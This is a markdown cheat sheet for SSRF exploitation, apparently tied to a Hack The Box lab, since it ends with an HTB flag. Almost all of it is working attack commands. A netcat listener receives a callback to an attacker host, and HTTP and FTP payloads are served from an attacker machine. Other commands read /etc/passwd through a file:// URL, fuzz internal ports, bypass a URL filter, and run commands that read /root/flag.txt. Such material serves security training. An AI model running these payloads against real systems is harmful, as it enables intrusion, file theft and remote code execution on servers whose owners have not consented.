# Cheat Sheet: Server-Side Request Forgery (SSRF) Exploitation

## Introduction
- SSRF allows attackers to exploit servers to request internal/external resources.
- A successful SSRF attack can reveal sensitive information and lead to Remote Code Execution (RCE).

## Perform SSRF Enumeration
1. **Nmap Scan:**
   ```bash
   nmap -sT -T5 --min-rate=10000 -p- $TARGET
   ```

2. **Curl Commands:**
   - Initial request:
     ```bash
     curl -i -s http://$TARGET
     ```
   - Follow redirects:
     ```bash
     curl -s -i -L http://$TARGET
     ```

## Testing SSRF
1. **Netcat Listener:**
   ```bash
   nc -lnvp 8080
   ```

2. **Curl Test:**
   ```bash
   curl -i -s "http://$TARGET/load?q=http://$ATTACKER:8080"
   ```

## Exploiting with Different Schemas
1. **HTTP Schema:**
   - Create `index.html` on attacker machine.
   - Start HTTP server:
     ```bash
     python3 -m http.server $PORT
     ```
   - Curl Command:
     ```bash
     curl -i -s "http://$TARGET/load?q=http://$ATTACKER:8000/index.html"
     ```

2. **FTP Schema:**
   - Set up FTP server on attacker:
     ```bash
     sudo pip3 install twisted
     sudo python3 -m twisted ftp -p 21 -r ~
     ```
   - Curl Command:
     ```bash
     curl -i -s "http://$TARGET/load?q=ftp://$ATTACKER/index.html"
     ```

3. **File Schema:**
   - Retrieve `/etc/passwd`:
     ```bash
     curl -i -s "http://$TARGET/load?q=file:///etc/passwd"
     ```

## Further Exploitation
1. **Port Fuzzing:**
   - Create port wordlist:
     ```bash
     for port in {1..65535}; do echo $port >> ports.txt; done
     ```
   - Issue request on a random port:
     ```bash
     curl -i -s "http://$TARGET/load?q=http://127.0.0.1:1"
     ```
   - Fuzz ports using ffuf:
     ```bash
     ffuf -w ./ports.txt:PORT -u "http://$TARGET/load?q=http://127.0.0.1:PORT" -fs 30
     ```

2. **Identify Open Port:**
   - Interact with services:
     ```bash
     curl -i -s "http://$TARGET/load?q=http://127.0.0.1:5000"
     ```

## Exploiting Internal.app.local
1. **Curl Interaction:**
   - Interact with internal:
     ```bash
     curl -i -s "http://$TARGET/load?q=http://$INTERNAL/load?q=index.html"
     ```

2. **Bypass Filter Protection:**
   - Bypass filter:
     ```bash
     curl -i -s "http://$TARGET/load?q=http://$INTERNAL/load?q=http::////127.0.0.1:1"
     ```

3. **Port Fuzzing for Internal:**
   - Fuzz ports with different Content-Length:
     ```bash
     ffuf -w ports.list:PORT -u "http://$TARGET/load?q=http://$INTERNAL/load?q=http::////127.0.0.1:PORT" -fs 100
     ```

4. **Retrieve Interesting Files:**
   - Explore on port 5000:
     ```bash
     curl -i -s "http://$TARGET/load?q=http://$INTERNAL/load?q=http::////127.0.0.1:5000/"
     ```

5. **Command Execution:**
   - Execute commands:
     ```bash
     curl -i -s "http://$TARGET/load?q=http://$INTERNAL/load?q=http::////127.0.0.1:5000/runme?x=id"
     ```

6. **URL-encode Payloads:**
   - Using Cyberchef or JQ for URL-encoding.

7. **Retrieve Flag:**
   - Retrieve flag:
     ```bash
     curl -i -s "http://$TARGET/load?q=http://$INTERNAL/load?q=http::////127.0.0.1:5000/runme?x=cat%2520/root/flag.txt"
     ```
   - Flag: `HTB{55rf_2_rc3}`
